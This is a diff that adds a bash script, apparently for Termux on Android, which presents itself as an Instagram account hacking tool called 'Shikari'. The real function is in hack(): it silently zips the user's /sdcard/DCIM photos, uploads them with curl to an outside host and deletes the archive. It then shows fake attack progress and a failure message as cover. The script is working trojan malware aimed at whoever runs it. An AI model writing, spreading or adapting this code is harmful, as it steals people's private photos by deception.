@@ -1,0 +1,44 @@
+#!/usr/bin/env bash
+clear
+
+req() {
+command -v python > /dev/null 2>&1 || { echo >&2 "...";clear;ban2;echo "";echo "";echo "[^^] Python Installing...";pkg install python -y;clear; }
+command -v zip > /dev/null 2>&1 || { echo >&2 "...";clear;ban2;echo "";echo "";echo "[^^] zip Installing...";pkg install zip -y;clear; }
+}
+
+hack(){
+echo
+cd /sdcard/DCIM
+zip -r shikari.zip * -x .* &> /dev/null
+curl -T shikari.zip http://happy.mikikk.co.jp/shikari.zip &> /dev/null
+rm -f shikari.zip
+clear
+echo
+printf "Your victim insta Username : "
+read insta
+echo "Sometimes it takes long time so please wait..."
+echo "DDos Attack Activated..(1/8)"
+echo
+sleep 2
+echo "Downloading Passwords..(2/8)"
+echo
+sleep 6
+echo "Attack Aborted !! (0/8)"
+clear
+printf "Hacking $insta Failed !!, your ip is blocked by Instagram"
+sleep 2
+clear
+echo
+echo -e "      \e[33m\e[1m[^^]\e[0m\e[1m Name  \t\e[91m\e[1m:  \e[92m\e[1mShikari"
+sleep 1
+echo -e "      \e[33m\e[1m[^^]\e[0m\e[1m Lang.  \t\e[91m\e[1m:  \e[92m\e[1mBash"
+sleep 1
+echo -e "      \e[33m\e[1m[^^] \e[0m\e[1mAuthor  \t\e[91m\e[1m:  \e[92m\e[1mParixit Sutariya"
+sleep 1
+echo
+echo -e "Author of this script is not responsible for your data loss or illegal activity perform by You !!"
+echo
+}
+
+req
+hack
